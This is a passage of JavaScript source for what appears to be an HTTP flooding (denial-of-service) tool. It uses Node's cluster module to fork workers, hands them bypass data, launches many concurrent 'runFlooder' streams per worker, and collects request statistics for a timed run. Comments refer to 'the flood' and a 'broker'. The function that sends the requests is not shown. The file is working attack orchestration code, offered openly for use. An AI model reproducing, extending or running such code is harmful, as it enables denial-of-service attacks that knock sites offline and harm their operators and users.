            const worker = cluster.fork();
            worker.send({ type: 'bypassData', data: bypassResults });
        }

        const statsInterval = setInterval(displayStats, 1000);

        cluster.on('message', (worker, message) => {
            if (message.type === 'stats') {
                global.totalRequests   += message.total   || 0;
                global.successRequests += message.success || 0;
                global.failedRequests  += message.failed  || 0;
            }
        });

        setTimeout(() => {
            clearInterval(statsInterval);
            logLine('ok', 'run complete · ' + args.time + 's · ' + (global.totalRequests || 0) + ' req');
            console.log(creditLine());
            process.exit(0);
        }, args.time * 1000);
    })();

} else {
    process.on('message', (msg) => {
        if (msg.type === 'bypassData') {
            global.bypassData = msg.data;

            for (let i = 0; i < MAX_CONCURRENT_STREAMS_PER_WORKER; i++) {
                setTimeout(() => runFlooder(), i * 50);
            }

            setInterval(() => {
                process.send({
                    type: 'stats',
                    total:   global.totalRequests   || 0,
                    success: global.successRequests || 0,
                    failed:  global.failedRequests  || 0
                });
                global.totalRequests   = 0;
                global.successRequests = 0;
                global.failedRequests  = 0;
            }, 1000);

            // Duration elapsed is a clean finish, not a failure. The master
            // reports exit code 0 the same way, and a worker exiting 1 here is
            // what makes a successful run show up as failed in the broker.
            setTimeout(() => process.exit(0), args.time * 1000);
        }
    });

    // The master tears the run down on its own clock; the worker stands by for
    // the same window plus a margin so a slow fork never cuts the flood short.
    setTimeout(() => process.exit(0), args.time * 1000 + 15000);
}

process.on('uncaughtException', () => { });
process.on('unhandledRejection', () => { });
